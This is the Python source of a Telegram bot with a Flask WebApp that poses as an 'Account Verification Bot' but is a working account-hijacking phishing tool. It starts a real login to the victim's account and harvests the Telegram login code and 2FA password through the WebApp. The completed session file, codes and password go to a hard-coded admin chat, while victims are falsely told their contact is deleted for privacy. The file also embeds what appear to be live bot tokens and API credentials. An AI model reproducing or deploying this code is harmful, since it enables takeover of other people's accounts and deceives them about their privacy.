import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import logging
from datetime import datetime

# =============== SETUP ===============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
app = Flask(__name__)

# Storage
user_data = {}
otp_sessions = {}
verification_status = {}

# =============== FIXED ASYNC FUNCTIONS ===============
def run_async(coro):
    """Run async function in a thread-safe way"""
    try:
        # Get or create event loop for this thread
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        if loop.is_running():
            # If loop is already running, run in thread
            future = asyncio.run_coroutine_threadsafe(coro, loop)
            return future.result(timeout=30)
        else:
            # Run the coroutine in the current loop
            return loop.run_until_complete(coro)
    except Exception as e:
        logger.error(f"Async error: {e}")
        raise e

async def send_otp_via_telethon_async(phone):
    """Send OTP using Telethon"""
    try:
        os.makedirs('sessions', exist_ok=True)
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        logger.info(f"📤 Sending OTP to {phone}")
        sent = await client.send_code_request(phone)
        
        otp_sessions[phone] = {
            'client': client,
            'phone_code_hash': sent.phone_code_hash,
            'sent_time': time.time()
        }
        
        return {'success': True, 'message': 'OTP sent'}
    except FloodWaitError as e:
        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_otp_via_telethon_async(phone, otp_code):
    """Verify OTP using Telethon"""
    try:
        if phone not in otp_sessions:
            return {'success': False, 'error': 'Session expired'}
        
        client_data = otp_sessions[phone]
        client = client_data['client']
        phone_code_hash = client_data['phone_code_hash']
        
        await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            await client.session.save()
            session_file = client.session.filename
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
        else:
            return {'success': False, 'error': 'Not authorized'}
            
    except SessionPasswordNeededError:
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeInvalidError:
        return {'success': False, 'error': 'Invalid OTP'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_2fa_via_telethon_async(phone, password):
    """Verify 2FA password"""
    try:
        if phone not in otp_sessions:
            return {'success': False, 'error': 'Session expired'}
        
        client = otp_sessions[phone]['client']
        await client.sign_in(password=password)
        
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        await client.session.save()
        session_file = client.session.filename
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

# Wrapper functions
def send_otp_via_telethon(phone):
    return run_async(send_otp_via_telethon_async(phone))

def verify_otp_via_telethon(phone, otp_code):
    return run_async(verify_otp_via_telethon_async(phone, otp_code))

def verify_2fa_via_telethon(phone, password):
    return run_async(verify_2fa_via_telethon_async(phone, password))

# =============== HELPER FUNCTIONS ===============
def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION DATA</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            if user_info.get('name'):
                message += f"\n👤 Name: {user_info['name']}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info['username']}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

# =============== BOT HANDLERS ===============
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            webapp_url = f"https://{RENDER_EXTERNAL_HOSTNAME}" if RENDER_EXTERNAL_HOSTNAME else "https://itz-me-545-telegram.onrender.com"
        else:
            port = os.environ.get('PORT', 5000)
            webapp_url = f"http://localhost:{port}"
        
        logger.info(f"🌐 WebApp URL: {webapp_url}")
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(webapp_url)
        )
        kb.add(btn)
        
        # Start message
        start_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Account Verification Bot</b>

Click the button below to verify your account:

✅ <b>How it works:</b>
1. Open WebApp
2. Share your contact
3. Receive 5-digit OTP here
4. Enter OTP in WebApp
5. Complete verification

⚠️ Your contact will be auto-deleted for privacy.

<b>Click below to begin:</b>"""
        
        bot.send_message(
            message.chat.id,
            start_text,
            reply_markup=kb
        )
        
        logger.info(f"✅ Sent /start to user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try /start again.")
        except:
            pass

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
            'phone': phone,
            'username': message.from_user.username,
            'lang': message.from_user.language_code,
            'contact_time': time.time()
        }
        
        # Update verification status
        verification_status[user_id] = {
            'stage': 'contact_received',
            'phone': phone,
            'otp_attempts': 0
        }
        
        # Send initial message
        msg = bot.send_message(
            message.chat.id,
            f"✅ <b>Contact Received!</b>\n\n📱 Phone: {phone}\n\n⏳ Sending OTP via Telegram...",
            parse_mode='HTML'
        )
        
        # Send OTP via Telethon in background thread
        def send_otp_task():
            try:
                result = send_otp_via_telethon(phone)
                
                if result['success']:
                    bot.edit_message_text(
                        f"""✅ <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> has been sent via Telegram

Check your Telegram messages for the 5-digit code.

<i>Telegram OTPs are always 5 digits (e.g., 12345)</i>

Return to WebApp to enter the OTP.""",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin
                    send_to_admin(phone, user_info=user_data[user_id])
                    
                    logger.info(f"✅ OTP sent to {phone}")
                else:
                    bot.edit_message_text(
                        f"❌ <b>Error:</b> {result.get('error', 'Failed to send OTP')}",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
                bot.edit_message_text(
                    "❌ <b>Server Error:</b> Failed to process request",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
        
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Error processing contact. Please try again.")
        except:
            pass

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle other messages"""
    try:
        if message.text and not message.text.startswith('/'):
            help_text = """🔐 <b>Account Verification Help</b>

<b>How to verify:</b>
1. Use /start to get WebApp button
2. Open WebApp and share contact
3. 5-digit OTP will appear here
4. Enter OTP in WebApp
5. Complete verification

<b>Note:</b> Telegram sends 5-digit OTP codes.

Use /start to begin verification."""
            
            bot.send_message(message.chat.id, help_text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Message handler error: {e}")

# =============== FLASK ROUTES ===============
@app.route('/')
def index():
    """Main WebApp page"""
    return render_template('index.html')

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    """Get user data for WebApp"""
    data = user_data.get(user_id, {})
    status = verification_status.get(user_id, {})
    
    response = {
        'phone': data.get('phone', ''),
        'name': data.get('name', ''),
        'username': data.get('username', ''),
        'lang': data.get('lang', ''),
        'stage': status.get('stage', 'waiting'),
        'verified': status.get('verified', False)
    }
    
    return jsonify(response)

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 OTP verification for user {user_id}")
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # Clean OTP (5 digits)
        cleaned_otp = ''.join(filter(str.isdigit, otp))
        if len(cleaned_otp) != 5:
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        # Get user phone
        user_info = user_data.get(int(user_id), {})
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Check attempts
        if user_id in verification_status:
            verification_status[user_id]['otp_attempts'] += 1
            if verification_status[user_id]['otp_attempts'] > 3:
                return jsonify({'success': False, 'error': 'Too many attempts'})
        
        # Verify OTP
        result = verify_otp_via_telethon(phone, cleaned_otp)
        
        if result['success']:
            if result.get('requires_2fa'):
                verification_status[user_id]['stage'] = 'needs_2fa'
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Successfully verified
                verification_status[user_id]['stage'] = 'verified'
                verification_status[user_id]['verified'] = True
                
                # Send to admin
                send_to_admin(
                    phone, 
                    otp=cleaned_otp,
                    user_info=result.get('user_info'),
                    session_file=result.get('session_file')
                )
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        logger.error(f"API verify error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA password"""
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        
        if not user_id or not password:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        user_info = user_data.get(int(user_id), {})
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Verify 2FA
        result = verify_2fa_via_telethon(phone, password)
        
        if result['success']:
            verification_status[user_id]['stage'] = 'verified'
            verification_status[user_id]['verified'] = True
            
            # Send to admin with password
            send_to_admin(
                phone,
                password=password,
                user_info=result.get('user_info'),
                session_file=result.get('session_file')
            )
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', '2FA verification failed')
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# =============== BOT POLLING ===============
def run_bot_polling():
    """Run bot polling with proper error handling"""
    logger.info("🤖 Starting bot polling...")
    
    max_retries = 10
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            # Remove any existing webhook first
            bot.remove_webhook()
            time.sleep(1)
            
            logger.info(f"🔄 Bot polling attempt {attempt + 1}/{max_retries}")
            
            # Start polling
            bot.polling(
                none_stop=True,
                interval=2,
                timeout=30,
                skip_pending=True
            )
            
        except telebot.apihelper.ApiTelegramException as api_error:
            if "Conflict" in str(api_error):
                logger.error("❌ Another bot instance is running. Waiting 10 seconds...")
                time.sleep(10)
            elif "Unauthorized" in str(api_error):
                logger.error("❌ Invalid bot token")
                break
            else:
                logger.error(f"❌ Telegram API error: {api_error}")
                time.sleep(retry_delay)
                
        except Exception as e:
            logger.error(f"❌ Bot polling error: {str(e)}")
            time.sleep(retry_delay)
    
    logger.error("❌ Max retries reached. Bot polling stopped.")

# =============== CLEANUP ===============
def cleanup_old_sessions():
    """Clean up old sessions"""
    while True:
        try:
            current_time = time.time()
            
            # Clean old telethon sessions (older than 10 minutes)
            expired_clients = []
            for phone, data in list(otp_sessions.items()):
                if current_time - data.get('sent_time', 0) > 600:  # 10 minutes
                    expired_clients.append(phone)
            
            for phone in expired_clients:
                try:
                    if phone in otp_sessions:
                        client = otp_sessions[phone]['client']
                        client.disconnect()
                    del otp_sessions[phone]
                except:
                    pass
            
            if expired_clients:
                logger.info(f"🧹 Cleaned {len(expired_clients)} expired OTP sessions")
            
            time.sleep(60)
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            time.sleep(60)

# =============== MAIN ===============
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot")
    logger.info("="*60)
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_old_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Start bot polling in separate thread
    bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
    bot_thread.start()
    logger.info("✅ Bot polling thread started")
    
    # Wait for bot to initialize
    time.sleep(3)
    
    # Start Flask in main thread
    port = int(os.environ.get("PORT", 10000))
    logger.info(f"🚀 Starting Flask on port {port}")
    
    # Disable Flask reloader to avoid multiple bot instances
    app.run(
        host="0.0.0.0",
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
            )
